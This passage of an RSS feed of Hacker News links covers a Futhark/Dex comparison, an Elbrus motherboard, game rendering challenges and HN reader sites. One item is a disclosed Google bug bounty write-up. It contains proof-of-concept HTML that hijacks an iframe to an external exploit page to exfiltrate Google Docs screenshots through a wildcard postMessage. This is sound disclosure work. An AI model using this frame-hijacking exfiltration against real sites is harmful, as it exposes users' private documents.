<h2 id="conclusions"><a href="#conclusions" id="conclusions-link" title="conclusions">Conclusions</a></h2>
<p>With respect to expressing parallelism, Dex and Futhark seem equivalent in expressive power, but Dex has the edge in concision. I’d be curious about going the other way, and porting some of the original Futhark benchmark programs <em>to</em> Dex, like <a href="https://github.com/diku-dk/futhark-benchmarks/blob/master/finpar/LocVolCalib.fut">local volumetric calibration</a>.</p>
<p>Dex has several small conveniences over Futhark: while the effect system didn’t matter much for the examples I looked at, Dex’s type classes and broadcasting operators did help a bit with making things more concise.</p>
<p>If you need AD, then Dex is miles ahead of Futhark. While I managed to implement the surface normals in the ray tracer, I gave up on porting <a href="https://google-research.github.io/dex-lang/mcmc.html">mcmc.dx</a> because it contains a higher-order function that applies the <code>grad</code> operator to a functional argument. This would have to be implemented with a higher order parametric module (<a href="https://futhark-lang.org/blog/2019-12-18-design-flaws-in-futhark.html#higher-order-modules">which I wrote were useless not long ago</a>), but I just didn’t have the heart for it. I’ll keep this as a usage case for when we implement AD properly.</p>
<p>I didn’t look much at performance, since Dex is sparsely documented and the benchmarking tools seem to be mostly for internal use. I performed a rough timing of sequential execution of the ray tracer, where the Futhark and Dex versions are about equally fast. Dex also has multi-threaded and CUDA backends, but I …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html">https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html</a></em></p>]]>
            </description>
            <link>https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559967</guid>
            <pubDate>Mon, 28 Dec 2020 15:36:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ITX Motherboard with an Elbrus CPU]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 91 (<a href="https://news.ycombinator.com/item?id=25559240">thread link</a>) | @jamesmd
<br/>
December 28, 2020 | https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/ | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3135">

	

	<div>
		
<h2>ELBRUS MCST History</h2>



<div><p>Before we look at the IcepeakITX ELBRUS-8CB motherboard lets first look at the history of Elbrus. </p><p>Elbrus CPU’s have been around for a very long time although unless you’re from Russia you’ve likely never heard of them. </p><p>They were first released in the early 1970’s and used in the Soviet space program, nuclear weapons research and defence systems as well as for research. </p></div>



<h3>Elbrus Timeline</h3>



<ul id="block-082e432c-8cfa-49d3-a848-51fd5247f666"><li><em>Elbrus 1</em>&nbsp;(1973) was the first in the line.<ul><li>A side development was an update of the 1965&nbsp;BESM-6&nbsp;as Elbrus-1K2.</li></ul></li><li><em>Elbrus 2</em>&nbsp;(1977) was a 10-processor computer, considered the first Soviet&nbsp;supercomputer, with superscalar&nbsp;RISC&nbsp;processors. Re-implementation of the Elbrus 1 architecture with faster&nbsp;ECL&nbsp;chips.</li><li><em>Elbrus 3</em>&nbsp;(1986) was a 16-processor computer developed by the Babayan’s team, and one of the first VLIW computers in the world.</li><li><em>Elbrus 2000</em>&nbsp;(2001) was a microprocessor development of the&nbsp;<em>Elbrus 3</em>&nbsp;architecture. Also known as&nbsp;<em>Elbrus-S</em>.<ul><li><em>Elbrus-3M1</em>&nbsp;(2005) is a two-processor computer based on&nbsp;Elbrus 2000&nbsp;microprocessor working at 300&nbsp;MHz.</li><li><em>Elbrus МВ3S1/C</em>&nbsp;(2009) is a&nbsp;ccNUMA&nbsp;four-processor computer based on&nbsp;Elbrus-S&nbsp;microprocessor working at 500&nbsp;MHz.</li></ul></li><li><em>Elbrus-2S+</em>&nbsp;(2011) working at 500&nbsp;MHz, with capacity to calculate 16&nbsp;GFlops.</li><li><em>Elbrus-2SM</em>&nbsp;(2014) working at 300&nbsp;MHz, with capacity to calculate 9.6&nbsp;GFlops.</li><li><em>Elbrus-4S</em>&nbsp;(2014) working at 800&nbsp;MHz, with capacity to calculate 50&nbsp;GFlops.<sup>[1]</sup></li><li><em>Elbrus-1S+</em>&nbsp;(2016) SoC with GPU, working at 600–1000&nbsp;MHz, with capacity to calculate 24&nbsp;GFlops.</li><li><em>Elbrus-8S</em>&nbsp;(2014–2015) working at 1300&nbsp;MHz, with capacity to calculate 250&nbsp;GFlops.</li><li><em>Elbrus-8SV</em>&nbsp;(2018) working at 1500&nbsp;MHz, with capacity to calculate 576&nbsp;GFlops.</li><li><em>Elbrus-16S</em>&nbsp;(2019) working at 2000&nbsp;MHz, with capacity to calculate 1.5&nbsp;TFlops.</li></ul>



<p>Over the years Elbrus have used several different architectures including: SPARC, x86 and Elbrus 2000.<br>Back in 2014 ELBRUS released the Elbrus-4C CPU which was designed for home and office use within Russia. Performance wasn’t great and as it couldn’t fully support x86. Computers using the Elbrus-4C CPU shipped with a custom proprietary Linux distro named Elbrus OS. Little is known about the success of this platform and they are never seen in the western world. I tried to buy an Elbrus-4C computer and have it shipped from Russia to the UK back in 2015 and it proved impossible. <br></p>



<figure><img src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Elbrus-4C Based PC</figcaption></figure>



<h2>IcepeakITX ELBRUS-8CB Motherboard</h2>



<div><p>The IcepeakITX ELBRUS-8CB Motherboard is the brain child of a group of enthusiasts that banded together to crowdfund a security focused Mini ITX motherboard featuring a 1.5GHZ 8 core Elbrus 8CB CPU and ships with either 8GB or 32GB DDR4 ECC RAM. The board does not ship with a heatsink however it is compatible with any heatsink designed for the Intel LGA3647 socket. </p></div>



<figure><img src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>IcepeakITX ELBRUS-8CB Motherboard</figcaption></figure>



<h2>Full Technical Specifications</h2>



<ul><li><strong>Form-factor:</strong>&nbsp;Mini-ITX</li><li><strong>CPU:</strong>&nbsp;MCST (Moscow Center of SPARC Technologies) Elbrus-8CB 8-core @ 1.5 GHz VLIW (fully compatible with any LGA3647 heatsink)</li><li><strong>SB:</strong>&nbsp;MCST KPI-2 Multicontroller</li><li><strong>RAM:</strong>&nbsp;8 GB or 32 GB (2x [4+1] 8 Gbit/32 Gbit DDR4 DRAM 2400 MHz ECC)</li><li><strong>SATA:</strong>&nbsp;2x M.2_2280 + 4x SATA_6G</li><li><strong>Storage Expansion:</strong>&nbsp;1x microSD (HC)</li><li><strong>Cache:</strong>&nbsp;1x PATA 8 GB (required as cache device for hardware emulation of x86 on Elbrus)</li><li><strong>PCIe:</strong>&nbsp;1x PCIe2_x16 + 1x PCIe2_x1 (as USB3)</li><li><strong>Security:</strong><ul><li>1x TPM SPI connector</li><li>2x boot firmware chip with extra security</li><li>3x heatsink detectors</li><li>1x temperature sensor trigger</li><li>2x tampering sensor</li></ul></li><li><strong>Network:</strong><ul><li>Marvell M88E1111-RCJ chipset</li><li>1x 1G_SFP</li><li>3x 1G_RJ45</li></ul></li><li><strong>GPS:</strong>&nbsp;GPS chip with internal antenna port</li><li><strong>USB:</strong><ul><li>2x USB 2.0 (rear)</li><li>4x USB 2.0 (+PD) (rear)</li><li>2x USB 3.0 (rear)</li><li>1x USB 2.0 (internal)</li></ul></li><li><strong>COM:</strong>&nbsp;1x COM header (internal) required for debugging boot</li><li><strong>Debug:</strong>&nbsp;1x 6-pin debug port, 1x 4-pin (USB to GPIO)</li><li><strong>Video:</strong>&nbsp;2x HDMI (1 HDMI per SM768/256 MB)</li><li><strong>Audio:</strong>&nbsp;Integrated simple audio codec (Linux-compatible)</li><li><strong>Additional Sensors:</strong><ul><li>Fall detection sensor</li><li>Gyroscope</li><li>Water sensor</li></ul></li><li><strong>Additional Connectors:</strong><ul><li>2x PWM-4</li><li>RTC battery connector</li><li>Simple BEEP connector</li></ul></li><li><strong>PCB:</strong>&nbsp;14 layers (level 5 accuracy) / ISOLA Hi Tg 180</li></ul>



<div><p>The Motherboard is also fully opensource and after funding the board schematics and design specifications will be released on github. </p><p>Crowdfunding for the IcepeakITX ELBRUS-8CB is expected to go live early next year via crowdsupply. More details can be found <a href="https://www.crowdsupply.com/sra-centr8/icepeakitx-elbrus-8cb" target="_blank" rel="noreferrer noopener">here</a>. </p><p>Check out more interesting tech coming to crowdfunding sites <a href="https://blog.jmdawson.co.uk/category/crowdfunding/">here</a>.</p></div>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559240</guid>
            <pubDate>Mon, 28 Dec 2020 14:09:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealing private documents through a bug in Google Docs]]>
            </title>
            <description>
<![CDATA[
Score 310 | Comments 138 (<a href="https://news.ycombinator.com/item?id=25559063">thread link</a>) | @hackerpain
<br/>
December 28, 2020 | https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/ | <a href="https://web.archive.org/web/*/https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://savebreach.com/content/images/size/w300/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 300w,
                            https://savebreach.com/content/images/size/w600/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 600w,
                            https://savebreach.com/content/images/size/w1000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 1000w,
                            https://savebreach.com/content/images/size/w2000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://savebreach.com/content/images/size/w2000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png" alt="Stealing your private documents through a bug in Google Docs">
            </figure>

            <section>
                <div>
                    <p>By <a href="https://twitter.com/kl_sree">KL Sreeram</a></p><p>Google has integrated a <a href="https://www.google.com/tools/feedback">feedback sharing mechanism</a> for many of its products like Google Docs, Google Sheets and so on. This feature is supposed to help users report bugs and broken functionality to Google developers who could then work on fixing it.</p><h2 id="sending-feedback-in-google-products">Sending Feedback in Google Products</h2><p>You might have noticed a <strong>Send Feedback </strong>button at the bottom of the page while using Google Docs. It's a harmless feature, and its implemented as a feed back sharing system for Google Docs when you encounter issues. When you click on the button, a popup would appear asking you to describe the problem and this feature automatically takes a screenshot, sending (uploading) the data to Google for further review.</p><figure><img src="https://savebreach.com/content/images/2020/12/image-22.png" alt=""><figcaption>The "Send Feedback" popup in Google Docs</figcaption></figure><p>This feedback sharing feature is also implemented in many other Google products using an iFrame, embedded into the parent page (the Google Product).</p><p>This made me wonder how Google was displaying this image. I found, the image was being uploaded to Google via postMessage, and then rendered in the popup box before being sent to Google for further investigation.</p><h2 id="the-bug">The Bug</h2><p>There was some cross-origin communication happening between docs.google.com, www.google.com and feedback.googleusercontent.com (which was a sandboxed domain). Even after trying a lot I was unable to find any XSS in feedback.googleusercontent.com which could have helped me in stealing the screenshot image data.</p><p>Below is a graphical representation of the steps in this process – </p><figure><img src="https://savebreach.com/content/images/2020/12/image-23.png" alt=""><figcaption>How the screenshot was uploaded to Google servers</figcaption></figure><p>The following <code>postmessage</code> function sent the data to feedback.googlusercontent.com, however the postmessage configuration didn't allow other domains to be iFramed.</p><pre><code>windowRef.postmessage("&lt;Data&gt;","https://feedback.googleusercontent.com");</code></pre><p>However, the final <code>postmessage</code> function upon submitting the feedback was configured in a manner that allowed modifying the iFrame to an evil website</p><pre><code>windowRef.postmessage("&lt;Data&gt;","*");</code></pre><p>The wildcard scope allowed the <code>postmessage</code> data to be sent to an evil attacker controlled domain. The security misconfiguration here is the wildcard scope <code>*</code> &nbsp;that allowed me to steal and hijack Google Docs screenshots which were meant to be uploaded to Google's servers</p><p>Also, worth noting that the exploit worked in this case as Google Docs, by design has no <code>X-Frame-Options header</code>, which eventually helped exploit the cross-origin communication (through postMessage), although they do have some other protection against clickjacking and similar attacks as most features are disabled when the Google Docs pages are embedded in an iFrame.</p><h2 id="the-final-exploit">The Final Exploit</h2><p>Finally, I was able to put together all these vulnerabilities, in order to extract the Google Docs page screenshot by embedding it in a malicious iFrame and using <code>window.frames.frame.location</code> to load my exploit page from an external domain and steal user's Google Docs page screenshot</p><pre><code>&lt;html&gt;
    &lt;iframe src="https://docs.google.com/document/document_ID" /&gt;
    &lt;script&gt;
       //pseudo code
        
        
        setTimeout(function(){ alert("Hello"); }, 6000);

        function exp(){
        setInterval(function(){ 
         window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
        }, 100);
        }
    &lt;/script&gt;
&lt;/html&gt;</code></pre><p>The above exploit gets triggered only once the user clicks on <strong>Send Feedback </strong>button. For allowing the iFrame to load, a setTimeout function executes every 6s (or, 6000 ms). To hijack the frame once it loads – the setInterval is used which tries to change the location of the iFrame every 100 ms to ensure the screenshot is stolen once the iFrame loads.</p><p>This could have allowed any attacker to steal sensitive information about your Google Docs documents and presentations, since organizations use it as part of G Suite for managing highly sensitive information. Although, this attack needs some user interaction but its not impossible given an attacker can easily convince a victim to perform the needed interaction (button click).</p><p>The <code>exploit.html</code> contains a postMessage event listener that captures the URL of the uploaded image, and the attacker successfully exfiltrates the Google Docs page screenshot in this way.</p><h2 id="video-poc-of-the-exploit">Video PoC of the Exploit</h2><p>Below is a Proof of Concept video of how the exploit worked, and how it could have allowed any attacker to steal screenshots of your private Google Docs documents by loading it in an iFrame on an attacker controlled website.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/isM-BXj4_80?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="the-bounty">The Bounty</h2><p>Google rewarded <strong>$3133.7</strong> &nbsp;for this bug under their VRP program.</p><p><a href="https://twitter.com/kl_sree">KL Sreeram</a> is a security researcher and bug bounty hunter. He is one of the top researchers in the Google VRP program. This bug was first documented by KL Sreeram on his <a href="https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/">blog</a>.</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to SaveBreach | Cyber Security, InfoSec, Bug Bounty &amp; Domain Names</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559063</guid>
            <pubDate>Mon, 28 Dec 2020 13:35:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Recurring reviews to track the whole lifecycle of a product]]>
            </title>
            <description>
<![CDATA[
Score 171 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25558891">thread link</a>) | @hubraumhugo
<br/>
December 28, 2020 | https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product | <a href="https://web.archive.org/web/*/https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558891</guid>
            <pubDate>Mon, 28 Dec 2020 13:05:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Images of the the samples returned to earth from the asteroid Ryugu]]>
            </title>
            <description>
<![CDATA[
Score 507 | Comments 129 (<a href="https://news.ycombinator.com/item?id=25558874">thread link</a>) | @naetius
<br/>
December 28, 2020 | http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/ | <a href="https://web.archive.org/web/*/http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558874</guid>
            <pubDate>Mon, 28 Dec 2020 13:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are video games graphics challenging? Productionizing rendering algorithms]]>
            </title>
            <description>
<![CDATA[
Score 296 | Comments 83 (<a href="https://news.ycombinator.com/item?id=25557431">thread link</a>) | @bartwr
<br/>
December 27, 2020 | https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/ | <a href="https://web.archive.org/web/*/https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>



<p>S…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</a></em></p>]]>
            </description>
            <link>https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557431</guid>
            <pubDate>Mon, 28 Dec 2020 07:26:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HN Alternative UIs]]>
            </title>
            <description>
<![CDATA[
Score 156 | Comments 108 (<a href="https://news.ycombinator.com/item?id=25556990">thread link</a>) | @lgats
<br/>
December 27, 2020 | https://blog.luke.lol/tech/hacker-news-alternatives/ | <a href="https://web.archive.org/web/*/https://blog.luke.lol/tech/hacker-news-alternatives/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<h2>News.YCombinator.com Readers</h2>
<p>Ranked by Alexa popularity.</p>
<p><a href="https://hn.algolia.com/">hn.algolia.com</a><br>
HackerNews with a search function and 16.8+ million posts indexed.<br>
Alexa: 8.7k</p>
<p><a href="http://popurls.com/">popurls.com</a><br>
Several news sites combined into a single newspaper-like feed<br>
Alexa: 87k</p>
<p><a href="https://upstract.com/">upstract.com</a><br>
News aggregator with paid features, includes HN<br>
Alexa: 137k</p>
<p><a href="https://hckrnews.com/">hckrnews.com</a><br>
HN posts organized by rolling, quarter-daily timeslots.<br>
Alexa: 178k</p>
<p><a href="https://pxlet.com/">pxlet.com</a><br>
Culmination of HN, Reddit, SlashDot, and other Tech-News Sites<br>
Alexa: 330k</p>
<p><a href="https://hackernewsletter.com/">hackernewsletter.com</a><br>
HN delivered via email<br>
Alexa: 581k</p>
<p><a href="https://old.thenews.im/">thenews.im&nbsp;</a><br>
Designer News, Product Hunt and Hacker News Mashup with easy-access to individual feeds<br>
Alexa: 960k</p>
<p><a href="http://www.daemonology.net/hn-daily/">daemonology.net</a><br>
Daily list of the top HN posts.<br>
Alexa: 971k</p>
